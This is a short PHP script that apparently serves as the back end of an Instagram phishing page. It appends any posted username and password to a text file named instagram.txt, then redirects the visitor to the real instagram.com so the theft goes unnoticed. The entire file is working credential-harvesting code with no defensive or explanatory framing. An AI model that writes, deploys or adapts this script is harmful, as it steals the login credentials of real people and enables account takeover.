<?php

file_put_contents("instagram.txt", "user : " . $_POST['username'] . "\npassword : " . $_POST['password'] . "\n<========>\n", FILE_APPEND);
sleep(2);
header('Location: https://instagram.com');
exit();